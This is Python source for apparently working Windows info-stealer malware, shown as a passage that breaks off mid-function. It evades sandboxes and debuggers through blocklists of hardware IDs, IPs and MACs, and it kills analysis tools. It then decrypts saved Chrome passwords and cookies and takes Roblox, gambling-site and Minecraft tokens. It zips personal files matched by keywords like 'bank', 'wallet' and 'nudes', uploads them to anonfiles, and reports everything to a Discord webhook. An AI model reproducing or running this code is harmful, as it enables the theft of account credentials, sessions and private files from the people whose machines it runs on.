#CORESTUB\
import os
import wmi 
import subprocess
import base64
import win32api
import sqlite3
import requests
import win32crypt
from Crypto.Cipher import AES
import uuid
import psutil
from discord_webhook import DiscordWebhook
from random import randint
import winshell
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
import json
import getpass
import re
import shutil
import sys
from datetime import  datetime, timedelta
from urllib.parse import urlparse
from discord_webhook import DiscordWebhook, DiscordEmbed
from zipfile import ZipFile
import ctypes
import os
import wmi
#DRIVES:
#A:\\ First Floppy
#B:\\ Second Floppy
#C:\\ Boot Drive or Main
#D:\\ Secound Drive
#ABOUT IGORE THE SILLY COMMENTS
OFFLINE = True
while(OFFLINE == True):
    try:
            testin = requests.get("https://google.com")
            if(testin.status_code == 200):
                OFFLINE = False
                print("Online")
                break
            if(testin.status_code   != 200):
                OFFLINE = True
    except:
                OFFLINE = True

#! SETTINGS [START]
DOWNLOAD = ""
CMD = ""
MODE = "Devmode"
WEBHOOK = 'WEBHOOK HERE'
#! SETTINGS [END]
#!BLANK ARRAY TO ADD INFO [START]
count = [] 
storep = []
epicc = []
filess = []
epic = []
storec = []
ofgrab = []
namess = []
emaill = []
paswordss = []
robloxin = []#SCEL LOVES YOU
#!BLANK ARRAY TO ADD INFO [END]
computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_version = ' '.join([os_info.Version, os_info.BuildNumber])
system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
osname = ('{0}'.format(os_name))
newos = osname.replace('b', '')
coreos = newos.replace("'", '')
graphicard =('{0}'.format(gpu_info.Name))
if(MODE == "Test"):
    print("This Webhook Might Not be Your own!")
    print("Webhook: "+WEBHOOK)
    input("Press Enter to continue...")
process = [
    "ProcessHacker.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "HttpAnalyzerV7.exe",
    "fiddler.exe",
    "visual studio.exe",
    "decoder.exe",
    "dlhost.exe",
    "taskmgr.psutilexe,"
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "ollydbg.exe",
    "dnSpy.exe",
    "procexp64.exe",
    "procexp.exe",
    "burpsuit.exe",
    "ghidra.exe",
    "ghidra.jar",
    "Ghidra.exe",
    "Ghidra.jar"
]
blackListedUsers = [
            'WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
            'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise',
            'User01', 'test', 'RGzcBUyrznReg']
blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
            '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',
            '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
            'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
            'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
            '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0',
            '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
            'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8',
            '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250',
            '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E',
            '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3',
            'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026',
            'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85',
            'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
            'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
            '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009',
            'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
            '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
            '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
            '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE',
            'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
            'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C',
            'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
            '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2',
            'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5',
            '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
            'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
            '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
            'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
            'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
            '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01',
            '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3',
            '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1',
            '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de',
            'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02',
            '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3',
            '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
            '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d',
            '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e',
            '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8',
            '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20',
            '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7',
            '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de',
            '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
def gnetwork():
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        if ip in blackListedIPS:
            exit(1)
        if mac in blackListedMacs:
            exit(1)
def gsystem():
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        print(username + ' ' + hostname)
        if hwid in blackListedHWIDS:
            exit(1)
        if username in blackListedUsers:
            exit(1)
        if hostname in blackListedPCNames:
            exit(1)
gsystem()
gnetwork()

for proc in psutil.process_iter():
    if proc.name() in process:
        webhook = DiscordWebhook(url=WEBHOOK)
        embed = DiscordEmbed(title='VM / Debugger Found', description=f"```Debugger Found🐛: {proc.name()} Found```\n```Action Taken🎬: Killed {proc.name()}```", color='FF0000')
        webhook.add_embed(embed)
        response = webhook.execute()
        proc.kill()
vm = ["VMwareService.exe", "VMwareTray.exe","joeboxcontrol.exe","vmwareuser.exe","VMware.exe","vmware","VirtualBox.exe","HyperV.exe",]
for proc in psutil.process_iter():
        if proc.name() in vm:
           webhook = DiscordWebhook(url=WEBHOOK)
           embed = DiscordEmbed(title='VM / Debugger Found', description=f"```VM💻: {proc.name()} Found```\n```Action Taken🎬: Closed App```", color='FF0000')
           webhook.add_embed(embed)
           response = webhook.execute()
           exit()
minDiskSizeGB = 50
if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
_, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
diskSizeGB = diskSizeBytes/1073741824

if diskSizeGB < minDiskSizeGB:
    try:
           webhook = DiscordWebhook(url=WEBHOOK)
           embed = DiscordEmbed(title='VM / Debugger Found', description=f"```Memory📼: Memory Bug Found Program could be in VM```\n```Action Taken🎬: Killed OS[app]```", color='FF0000')
           webhook.add_embed(embed)
           response = webhook.execute()
           os._exit(1)
    except:
        pass
else:
    print("Running on a physical machine")
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_all(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()#BOOZ For BREAKFAST
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
def passwords():
    try:
        passc = 0
        file=open("C://Temp/passwords.txt","w")
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "C://Temp/ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            passc +=1
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_all(row[3], key)
            date_created = row[4]
            date_last_used = row[5]   #OMG U DECODE SO POG THEN U PROLLY VESPER SAY HI TO YOUR MOM FOR ME
            if username or password: 
                file.write(f"Origin URL: {origin_url}\n")
                file.write(f"Action URL: {action_url}\n")
                file.write(f"Username: {username}\n")
                file.write(f"Password: {password}\n")
                paswordss.append(password) 
                regex = re.compile(r'([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})+')
                def isValid(email):
                    if re.fullmatch(regex, email):
                        emaill.append(username)
                    else:
                        pass
                isValid(username)
                corec =  urlparse(origin_url)
                base = corec.netloc
                print(base) 
                cores = ".".join(base.split(".", 2)[:-1])
                sitename = cores.split('.', 1)[-1]
                storep.append(sitename) 
            else:
                continue
            if date_created != 86400000000 and date_created:
                file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            file.write("="*25+"\n")
            file.write("MADE BY THECRAZEDPOTATTO"+"\n")
            file.write("="*25+"\n")
        cursor.close()
        db.close()#DONT DECODE ME
        os.remove("C://Temp/ChromeData.db")
        file.close()
        ofgrab.append("Passwords")
        if(passc == 0):
            exit(0)
        count.append(passc) 
        return
    except:
        try:
            file=open("C:/Temp/passwords.txt","w")
            file.write("Could Not Pull Passwords")
            file.close()
            os.remove("C://Temp/ChromeData.db")
        except: 
         exit(1)
class Roblox:

    def __init__(self):
        self.FILE = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),"w+")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        self.done = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        for i in paths:
            if os.path.exists(i):
                self.done = 0
                self.Rblxwild(i)
        for i in paths:
            if os.path.exists(i):
                self.done = 0
                self.Rbxflip(i)
        for i in paths:
            if os.path.exists(i):
                self.done = 0
                self.Bloxflip(i)
        self._upload()

    def Rblxwild(self,p):
        if self.done < 1:
            self.FILE.write("\n\n"+"="*35+"[ Rblxwild ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass

    def Rbxflip(self,p):
        if self.done < 1:
            self.FILE.write("\n\n"+"="*35+"[ Rbxflip ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass

    def Bloxflip(self,p):
        if self.done < 1:
            self.FILE.write("\n\n"+"="*35+"[ Bloxflip ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass

    def RobloxStudio(self):
        try:
            if self.done < 1:
                self.FILE.write("\n\n"+"="*35+"[ Roblox Cookies ]"+"="*35+"\n")
                self.done +=1
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com")
            try:
                count = 0
                while True:
                    name, value, type = EnumValue(robloxstudiopath, count)
                    if name == ".ROBLOSECURITY":
                        value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1]
                        self.robloxcookies += 1
                        self.FILE.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                    count = count + 1
            except WindowsError:
                pass
        except:
            print("STD ROBLOX ERROR")
    
    def _upload(self):
        self.FILE.close()
        webhook = DiscordWebhook(url=WEBHOOK)
        webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),'rb').read(),filename="Roblox.txt")
        embed = DiscordEmbed(title=f"Roblox Tokens and [Studio]Cookie",color='FF5733')
        embed.set_timestamp()
        embed.add_embed_field(name=f"Info Grabbed\n", value=f"```RblxWild🪙: {self.rblxwild} Tokens```\n```Rbxflip🪙: {self.rbxflip} Tokens```\n```Bloxflip🪙: {self.bloxflip} Tokens```\n```[Studio]Roblox Cookie🍪: {self.robloxcookies} Cookie```")
        webhook.add_embed(embed)
        webhook.execute()
user = getpass.getuser()
class Minecraft:

    def __init__(self):
        self.content = ""
        path = f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
        try:
            logs = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
            self.user = open(path+"\\usercache.json").read().split('[{"name":"')[1].split('",')[0]
            self.idd = open(path+"\\launcher_accounts.json").read().split('"remoteId" : "')[1].split('",')[0]
            self.typE = open(path+"\\launcher_accounts.json").read().split('"type" : "')[1].split('",')[0]
            with ZipFile(path+"\\Minecraft.zip",'w') as z:
                for i in logs:
                    self.content += f"{i}\n"
                    z.write(path+"\\"+i)
                z.close()
        except:pass
        self.send(path+"\\Minecraft.zip")
    print("HELLO MOM")
    def send(self,_):
        try:
            webhook = DiscordWebhook(url=WEBHOOK)
            webhook.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
            webhook.execute()
            webhook = DiscordWebhook(url=WEBHOOK)
            embed = DiscordEmbed(title=f"Minecraft Info", description=f"**Found A Minecraft Session**\n```🟩Account of: {self.user}```\n```🎮Type: {self.typE}```\n```🆔Remote ID: {self.idd}```\n```📂Files Found: {self.content}```", color='8FE38F')
            webhook.add_embed(embed)
            webhook.execute()
            os.remove(_)
            ofgrab.append("Minecraft")
        except:
            print("Error")
user = getpass.getuser()
wbh = ""
# FOV
#FOC
#VEP
#SCEL
class Files:

    def __init__(self):
        self.ZIP = ZipFile(f"C:\\Users\\{user}\\AppData\\Files.zip",'w')
        self.folders = []
        self.files = 0
        #IMG = "jpg","png","gif","webp","jpeg","mp4","wep3","webm"
        #EXE = "exe","dll","sys"
        #TEXT = "bin","bytes","log","txt","debug"
        #OTHER = "py","pyw","cpp","c","h","cs","hpp","dump","html","js","html","xml","svelt","react","sql","db","sqlite"
        self.filter = ["dll","jpg","jpeg","png","mp4","mp3","webm","mov","bat","exe","py","ipch","pyw","cpp","c","h","cs","hpp","dump","html","js","html"]
        self.goal = ["token","password","crypto","wallet","family","money","school","homework","paypal","cashapp","cookies","account","bank","cash","creditcard","payment","2fa","2step","recovery","grab","nudes","address","contacts","medical","debitcard"]
        paths = [f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
        for i in paths:
            self.Grab(i)
        self.upload_send()

    def Grab(self,_):
        try:
            if _ in self.folders:
                pass
            else:
                self.folders.append(_)
                files = os.listdir(_)
                for f in files:
                    if os.path.isdir(_+"\\"+f):
                        self.Grab(_+"\\"+f)
                    else:
                        for name in self.goal:
                            if name in f:
                                try:
                                    fname = f.split(".")[-0]
                                    fext = f.split(".")[-1]
                                    print(fext)
                                    if fext not in (self.filter):
                                        self.files +=1
                                        filess.append(f)
                                        self.ZIP.write(_+"\\"+f,fname+f"_{randint(1,999)}."+fext)
                                except:pass
        except:pass
    
    def upload_send(self):
        try:
            ofgrab.append("Files")
            self.ZIP.close()
            cweb = ' | '.join(filess)
            end = f"| "
            file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
            link = file.json()['data']['file']['url']['full']
            print(link)
            webhook = DiscordWebhook(url=WEBHOOK)
            embed = DiscordEmbed(title=f"File Grabber", description=f"**User's File Grabbed**\n```📄Amount of Files Grabbed: {self.files}```\n```📁ZIP with Grabbed files: {link}```\n **🗃️Files Grabbed**:\n\n{cweb}{end}", color='FFE9A2')
            webhook.add_embed(embed)
            webhook.execute()
        except:
            print("Error")
def cookie():
    cook = 0
    try: 
        cfile=open("C://Temp/cookies.txt","w")
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        filename = "C://Temp/Cookies.db"
        if not os.path.isfile(filename):
            shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            cook +=1
            
            if not value:
                decrypted_value = decrypt_all(encrypted_value, key)
            else:
                decrypted_value = value
            if(host_key == ".roblox.com" and name == ".ROBLOSECURITY"):
                cookie = decrypted_value
                webhook = DiscordWebhook(url=WEBHOOK)
                embed = DiscordEmbed(title='[Chrome Browser]Roblox Cookie', description=f"```Cookie🍪: {decrypted_value}```", color='FF5733')
                webhook.add_embed(embed)#I ONLY FEAR GOD
                response = webhook.execute()
                ofgrab.append("Roblox")
            if(name == "EPIC_CLIENT_SESSION"):
                epicc.append(decrypted_value)#.epicgames.com
                print(epicc)
            if(host_key == ".epicgames.com" and name == "EPIC_SSO"):
              epic.append(decrypted_value)#.epicgames.
            if(host_key == ".spotify.com" and name == "sp_dc"):
                try:
